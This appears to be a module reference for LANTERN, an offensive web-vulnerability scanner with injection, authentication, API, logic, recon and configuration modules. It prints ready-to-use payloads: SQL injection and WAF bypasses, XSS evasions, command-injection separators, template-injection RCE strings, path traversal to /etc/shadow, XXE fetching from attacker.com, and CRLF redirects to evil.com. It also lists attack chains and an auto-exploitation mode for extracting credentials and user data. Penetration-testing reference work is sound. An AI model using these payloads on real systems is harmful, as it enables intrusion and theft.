# LANTERN Module Encyclopedia

Complete technical reference for all 62 LANTERN modules.

## Module Categories

### Injection Modules (15)

#### sqli - SQL Injection Scanner (914 lines, EXPLOITABLE)
**Detection Methods:**
- Error-based: Triggers DB errors revealing type (MySQL, MSSQL, PostgreSQL, Oracle, DB2, SQLite)
- Boolean-based: Compares true/false condition responses
- Time-based: Measures response delays with SLEEP/WAITFOR/pg_sleep
- JSON body: Tests common JSON keys (emailID, username, id, query)
- Header injection: Tests User-Agent, Referer, X-Forwarded-For, Cookie
- Path-based: Tests URL path segments
- NoSQL: Tests MongoDB operators ($gt, $ne, $where, $regex)

**Database-Specific Payloads:**
```
MySQL:     ' AND SLEEP(5)-- 
MSSQL:     '; WAITFOR DELAY '00:00:05'-- 
PostgreSQL: ' AND pg_sleep(5)-- 
Oracle:    ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
SQLite:    ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

**Error Patterns (47 patterns):**
- MySQL: `SQL syntax.*MySQL`, `Warning.*mysql_`, `MySqlException`
- MSSQL: `Driver.*SQL[\-\_\ ]*Server`, `OLE DB.*SQL Server`, `Unclosed quotation mark`
- PostgreSQL: `PostgreSQL.*ERROR`, `Warning.*\Wpg_`, `PG::SyntaxError`
- Oracle: `ORA-[0-9]{5}`, `Oracle error`, `quoted string not properly terminated`
- SQLite: `SQLite.*error`, `sqlite3\.OperationalError`, `\[SQLITE_ERROR\]`

**WAF Bypasses:**
- Space → `/**/`, `%09`, `%0a`, `%00`
- Case: `SeLeCt`, `UnIoN`, `AnD`
- Version comments: `/*!50000SELECT*/`

**Exploitation:**
- UNION column enumeration (1-20 columns)
- Schema extraction: version, database, tables, columns
- Data extraction: prioritizes users, admin, credentials, passwords tables
- Blind character-by-character extraction
- MSSQL STRING_AGG for Azure SQL

**When to Use:**
- Any parameter accepting user input
- Login forms, search, filters
- API endpoints with IDs
- Use --aggressive for WAF-protected targets

---

#### xss - Cross-Site Scripting (516 lines, EXPLOITABLE)
**Detection Methods:**
- Context detection: HTML, attribute, script, style, comment, tag
- Reflection analysis: Finds where input appears in response
- WAF fingerprinting: Detects and bypasses common WAFs

**Context-Specific Payloads:**
```
HTML:      <script>alert(1)</script>, <img onerror=alert(1)>
Attribute: " onmouseover="alert(1), " onfocus="alert(1)"
Script:    "-alert(1)-", ';alert(1)//
Style:     </style><script>alert(1)</script>
Comment:   --><script>alert(1)</script><!--
```

**WAF Bypass Techniques:**
- Case variations: `<ScRiPt>`, `<IMG/SRC=x/OnErRoR=alert(1)>`
- Tag variations: `<svg/onload=alert(1)>`, `<img/src=x/onerror=alert(1)>`
- Encoding: HTML entities, unicode, double encoding
- eval bypass: `eval(atob('YWxlcnQoMSk='))`
- Constructor: `[]['constructor']['constructor']('alert(1)')()`

---

#### cmdi - Command Injection (331 lines, EXPLOITABLE)
**Separators Tested:**
```
; id       (semicolon)
| id       (pipe)
& id       (background)
&& id      (AND)
|| id      (OR)
`id`       (backticks)
$(id)      (command substitution)
%0aid      (newline)
```

**Space Bypass:**
```
${IFS}     - Internal Field Separator
$IFS$9     - $9 = empty
%09        - Tab character
{,}        - Brace expansion
```

**Detection:**
- Looks for command output (uid=, root, /bin, /etc)
- Time-based: sleep commands
- OOB: DNS/HTTP callbacks

---

#### ssti - Server-Side Template Injection (430 lines, EXPLOITABLE)
**Engine Detection:**
| Engine | Detection | RCE Payload |
|--------|-----------|-------------|
| Jinja2 | `{{7*7}}` → `49` | `{{config.__class__.__mro__[1].__subclasses__()}}` |
| Twig | `{{7*7}}` → `49` | `{{_self.env.registerUndefinedFilterCallback("exec")}}` |
| Freemarker | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>` |
| Velocity | `#set($x=7*7)$x` | `#set($rt=$x.class.forName("java.lang.Runtime"))` |
| Smarty | `{php}` | `{system('id')}` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |

---

#### lfi - Local File Inclusion (414 lines, EXPLOITABLE)
**Traversal Patterns:**
```
../../../etc/passwd              (basic)
....//....//....//etc/passwd     (double encoding)
..%2f..%2f..%2f/etc/passwd       (URL encoding)
..%252f..%252f/etc/passwd        (double URL encoding)
..%c0%af..%c0%af/etc/passwd      (overlong UTF-8)
/etc/passwd%00.jpg               (null byte)
```

**Target Files:**
- Linux: /etc/passwd, /etc/shadow, /proc/self/environ
- Windows: C:\windows\win.ini, C:\boot.ini
- Application: config.php, .env, web.config

---

#### xxe - XML External Entity (460 lines, EXPLOITABLE)
**Attack Types:**
```xml
<!-- Classic XXE (file read) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- Blind XXE (OOB) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>

<!-- XXE via file upload (.svg, .docx, .xlsx) -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

---

#### crlf - CRLF Injection (558 lines, EXPLOITABLE)
**Payloads:**
```
%0d%0aSet-Cookie:evil=value
%0d%0aLocation:http://evil.com
%0d%0a%0d%0a<script>alert(1)</script>
```

---

#### deserial - Deserialization (632 lines, EXPLOITABLE)
**Gadget Chains:**
- Java: Commons Collections, Spring, etc.
- PHP: Monolog, Laravel, Symfony
- Python: pickle, PyYAML
- .NET: TypeNameHandling, ObjectDataProvider

---

### Authentication Modules (14)

#### idor - Insecure Direct Object Reference (855 lines, EXPLOITABLE)
**ID Detection:**
- 57 keywords: id, uid, user, account, profile, doc, file, order, invoice...
- Path patterns: /users/123, /api/v1/resource/456
- UUID pattern: 8-4-4-4-12 hex
- Base64-encoded IDs
- MD5/SHA1/SHA256 hashed IDs

**Test Methods:**
- Numeric: increment, decrement, 0, 1, negative
- UUID: all-zeros, all-ones, bit flip
- Base64: decode → modify → re-encode
- Hash: compute common values (1, admin, test)
- Cross-user: request as user A, verify user B's data
- GraphQL: node ID manipulation

**Sensitive Data Extraction:**
- Emails, usernames, phones, SSNs
- Addresses, credit cards, balances
- Passwords, API keys, tokens

---

#### jwt - JWT Attack Suite (590 lines, EXPLOITABLE)
**Attacks:**
- Algorithm confusion: RS256 → HS256 (sign with public key)
- Algorithm none: Remove signature
- Key confusion: Use public key as HMAC secret
- Claim manipulation: Change sub, role, admin
- JKU/X5U injection: Point to attacker's key
- Kid injection: Path traversal, SQLi in kid
- Weak secret brute force

---

#### oauth - OAuth Misconfiguration (546 lines, EXPLOITABLE)
**Attacks:**
- Open redirect in redirect_uri
- Authorization code reuse
- CSRF in state parameter
- Scope escalation
- Token leakage
- Client credential theft

---

#### mfa - MFA Bypass (547 lines, EXPLOITABLE)
**Attacks:**
- Step skip: Jump directly to post-MFA endpoint
- Rate limit: Brute force OTP
- Response manipulation: Change failed → success
- Backup code abuse: Weak backup codes
- Session fixation: Pre-authenticated sessions

---

#### accessctl - Access Control (356 lines, EXPLOITABLE)
**Tests:**
- Unauthenticated admin access
- Horizontal escalation: User A → User B's data
- Vertical escalation: User → Admin functions
- Function-level: DELETE, PUT on resources
- Forced browsing: /debug, /internal, /.git
- Method override: X-HTTP-Method-Override
- JWT none algorithm
- Parameter pollution

---

### API Modules (4)

#### graphql - GraphQL Security (644 lines, EXPLOITABLE)
**Attacks:**
- Introspection query
- Batch query DoS
- Nested query complexity
- Field suggestion enumeration
- Directive injection
- Subscription abuse

---

#### api - REST API (265 lines)
**Tests:**
- Version enumeration (/v1, /v2, /v3)
- Method fuzzing (OPTIONS, PATCH, DELETE)
- Content-type manipulation
- Rate limit bypass
- Parameter pollution

---

### Business Logic Modules (5)

#### logic - Business Logic (256 lines, EXPLOITABLE)
**Parameter Tampering:**
| Parameter | Test Values | Attack |
|-----------|-------------|--------|
| price | 0, 0.01, -1 | Free items |
| quantity | 0, -1, 999999 | Quantity abuse |
| discount | 100, 999 | Full discount |
| step/stage | 0, final, complete | Step skip |
| role | admin, superuser | Privilege escalation |
| payment_status | paid, completed | Payment bypass |

**Attacks:**
- Checkout flow manipulation
- Multi-step bypass
- Payment status override
- Coupon stacking

---

#### payment - E-commerce (401 lines)
**Tests:**
- Price manipulation
- Currency confusion
- Negative quantities
- Coupon abuse
- Race conditions on checkout
- Payment method bypass

---

#### race - Race Conditions (365 lines, EXPLOITABLE)
**Attacks:**
- Double-spend
- Concurrent session abuse
- Inventory racing
- Coupon race
- Account registration race

---

### Recon Modules (13)

#### techdetect - Technology Detection (325 lines)
**Fingerprints:**
- Frameworks: React, Angular, Vue, Django, Laravel, Rails, Express
- CMS: WordPress, Drupal, Joomla, Magento
- Servers: Apache, Nginx, IIS, Tomcat
- Languages: PHP, Python, Java, .NET, Node.js
- WAFs: Cloudflare, AWS WAF, Akamai, ModSecurity

---

#### dirbust - Directory Brute Force (411 lines)
**Wordlists:**
- Common paths, backup files, config files
- Technology-specific paths
- API versioning paths

---

#### subdomain - Subdomain Enumeration (196 lines)
**Methods:**
- DNS brute force (high-speed)
- Certificate transparency
- Search engine queries

---

#### takeover - Subdomain Takeover (496 lines, EXPLOITABLE)
**Detects:**
- AWS S3, CloudFront, Elastic Beanstalk
- Azure, Heroku, GitHub Pages
- Shopify, Tumblr, Fastly
- 30+ vulnerable services

---

#### cloud - Cloud Misconfiguration (499 lines, EXPLOITABLE)
**Checks:**
- AWS S3 bucket permissions
- Azure blob storage
- GCP storage
- Exposed credentials
- SSRF to metadata endpoints

---

### Configuration Modules (7)

#### headers - Security Headers (583 lines)
**Checks:**
- CSP, X-Frame-Options, X-XSS-Protection
- HSTS, X-Content-Type-Options
- Referrer-Policy, Feature-Policy
- CORS headers

---

#### ssl - SSL/TLS (704 lines)
**Checks:**
- Certificate validity, chain, expiration
- Protocol versions (SSL2, SSL3, TLS1.0, TLS1.1)
- Cipher suites (weak ciphers)
- Heartbleed, POODLE, BEAST

---

#### waf - WAF Detection (405 lines)
**Identifies:**
- Cloudflare, AWS WAF, Akamai
- ModSecurity, Imperva, F5
- 20+ WAF signatures
- Bypass technique selection

---

### Advanced Modules

#### h2smuggle - HTTP/2 Smuggling (321 lines, EXPLOITABLE)
**Attacks:**
- H2.CL: Content-Length in HTTP/2
- H2.TE: Transfer-Encoding in HTTP/2
- CRLF in pseudo-headers

---

#### websocket - WebSocket Security (496 lines, EXPLOITABLE)
**Attacks:**
- Cross-site WebSocket hijacking
- Origin bypass
- Message injection
- Upgrade smuggling

---

#### prototype - Prototype Pollution (268 lines)
**Attacks:**
- `__proto__` injection
- constructor.prototype manipulation
- JSON.parse pollution

---

## Module Selection Guide

**By Vulnerability Type:**
| Goal | Modules |
|------|---------|
| RCE | cmdi, ssti, deserial, upload, ssrf |
| Data Theft | sqli, ssrf, lfi, xxe, idor, disclosure |
| Auth Bypass | sqli, ldap, auth, jwt, oauth, mfa, session |
| Client-Side | xss, dom, prototype, cors, csrf |
| API Testing | api, graphql, massassign, jwt, idor |
| Recon | techdetect, fingerprint, subdomain, dirbust |

**By Technology:**
| Stack | Priority Modules |
|-------|-----------------|
| PHP | sqli, lfi, ssti, deserial, upload |
| Java | deserial, ssti, xxe, sqli |
| Node.js | prototype, ssti, nosql, xss |
| Python | ssti, deserial, cmdi, sqli |
| .NET | deserial, xxe, sqli, viewstate |

**Attack Chains:**
```bash
--chain rce          # cmdi, ssti, deserial, upload, ssrf
--chain auth_bypass  # sqli, ldap, auth, jwt, oauth, mfa, session
--chain data_theft   # sqli, ssrf, lfi, xxe, idor, disclosure, cloud
--chain xss_chain    # csp, xss, dom, prototype, cors, csrf
--chain api_attack   # api, graphql, massassign, jwt, idor
```

## Exploitation Priority

**EXPLOITABLE modules (auto-extract data):**
1. sqli - Database contents
2. idor - User records
3. lfi - File contents
4. xxe - File contents + SSRF
5. ssrf - Internal services
6. cmdi - Command output
7. ssti - RCE
8. deserial - RCE
9. jwt - Token forging
10. oauth - Account takeover

**Run with --exploit flag for auto-exploitation**
